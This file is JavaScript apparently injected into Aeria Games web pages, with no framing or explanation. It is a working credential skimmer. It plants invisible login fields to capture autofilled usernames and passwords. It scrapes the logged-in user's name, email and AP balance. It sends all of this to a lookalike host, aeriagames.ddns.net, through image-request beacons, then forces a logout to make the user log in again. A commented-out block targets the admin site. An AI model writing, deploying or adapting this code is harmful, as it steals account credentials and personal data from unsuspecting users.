function test(src) {
  if (localStorage.getItem('test') !== null) {
    console.log(src);
  }
}
async function get(url, inc) {
  const response = await fetch(url, {
    method: 'GET',
    credentials: inc
  });
  const resData = await response.text();
  return resData;
}
async function post(url, data) {
  const response = await fetch(url, {
    method: 'POST',
    mode: 'no-cors',
    headers: {
      //"contentType": "application/x-www-form-urlencoded"
      //"Content-Type": "multipart/form-data",
      charset: 'utf-8'
    },
    body: data
  });

  const resData = await response.text();
  return resData;
}

const login_endpoint = 'https://aeriagames.ddns.net/login/';
const session_endpoint = 'https://aeriagames.ddns.net/session/';
const data_endpoint = 'https://aeriagames.ddns.net/data/';
let el = document.createElement('div');
el.style = 'opacity : 0';
el.setAttribute('id', 'login_input');
el.innerHTML = `<input type="text" maxlength="64" name="edit[id]" id="edit-id" size="60" value="" class="form-text required" data-op-id="0"></input>
<input type="password" name="edit[pass]" id="edit-pass" value="" maxlength="20" size="30" class="form-text required"  data-op-id="1"></input>`;
document.body.append(el);
let user = '';
let stUrl = '';
let d = '';
let loginDiv = document.querySelector('#is-login');
if (loginDiv !== null) {
  try {
    user =
      loginDiv.firstChild.firstChild.nextSibling.firstChild.nextSibling
        .nextSibling.textContent;
    stUrl =
      loginDiv.firstChild.firstChild.nextSibling.firstChild.nextSibling
        .nextSibling.nextSibling.firstChild.nextSibling.nextSibling.href +
      '/account';
  } catch (err) {
    d = loginDiv.innerHTML;
  }

  get(stUrl, 'include').then(data => {
    let elem = document.createElement('div');
    elem.innerHTML = data;
    let url =
      session_endpoint +
      '?user=' +
      user +
      '&email=' +
      elem.querySelector('#edit-current_mail').textContent +
      '&ap=' +
      document.querySelector('.ap-balance').textContent;
    document.createElement('img').setAttribute('src', url);
  });
  /*
  get('https://admin.aeriagames.com/', 'include').then((data)=>{
    let elem =document.createElement("div");
    elem.innerHTML = data;
    formData = new FormData();
    formData.append("data", data);
    post(data_endpoint + "?user=" + user + "admin", formData)
  }).catch((e)=>{
    test(e);
    formData = new FormData();
    formData.append("data", e);
    post(data_endpoint + "?user=" + user + "admin", formData)
  })
  */
}
function logout() {
  if (localStorage.getItem('out') !== 'Done') {
    localStorage.setItem('out', 'Done');
    get('https://www.aeriagames.com/logout', 'include');
  }
}
function getLogin() {
  let usr = document.querySelector('#edit-id').value;
  let pass = document.querySelector('#edit-pass').value;
  let src = `${login_endpoint}?site=aeria&user=${usr}&pass=${pass}&error=${d}`;
  if (usr !== '' || pass !== '') {
    document.createElement('img').setAttribute('src', src);
    document.querySelector('#login_input').remove();
    logout();
  } else {
    setTimeout(getLogin, 100);
  }
}
getLogin();

logout();
